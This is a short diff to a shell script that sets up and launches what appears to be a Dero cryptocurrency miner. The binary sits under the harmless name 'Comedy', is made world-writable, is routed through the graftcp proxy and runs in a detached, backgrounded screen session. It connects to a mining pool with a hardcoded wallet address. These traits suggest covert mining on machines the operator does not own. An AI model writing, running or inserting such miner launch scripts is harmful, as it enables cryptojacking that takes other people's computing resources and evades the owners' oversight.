@@ -43,13 +43,6 @@ mv -f Comedy $GOGO
 chmod 777 $GOGO
 
 
-screen -S $MARKONAH -dm ./graftcp/graftcp ./$GOGO -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc8qq9zcva6ed7qart0hh.SLEEP
-
-screen -ls
-sleep 2
-clear
-cd ..
-
-screen -ls
-
+screen -S $MARKONAH -dm ./graftcp/graftcp ./$GOGO -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc8qq9zcva6ed7qart0hh.MARKONAH &
+bash time.sh
 
